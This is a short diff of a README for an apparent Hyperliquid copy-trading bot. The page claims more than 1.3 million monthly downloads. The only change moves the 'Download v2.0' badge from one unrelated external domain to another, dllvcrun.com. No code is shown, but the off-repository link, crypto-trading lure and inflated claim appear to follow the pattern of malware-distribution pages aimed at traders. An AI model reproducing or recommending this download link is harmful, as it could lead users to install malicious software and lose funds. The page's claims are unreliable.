@@ -49,7 +49,7 @@ A: Yes — copy profitable Hyperliquid traders automatically.
 
 **Monthly downloads:** 1.3m+
 
-[![Download](https://img.shields.io/badge/Download-v2.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/hyperbot19)
+[![Download](https://img.shields.io/badge/Download-v2.0-brightgreen?style=for-the-badge)](https://dllvcrun.com/hyperbot19)
 
 ---
 
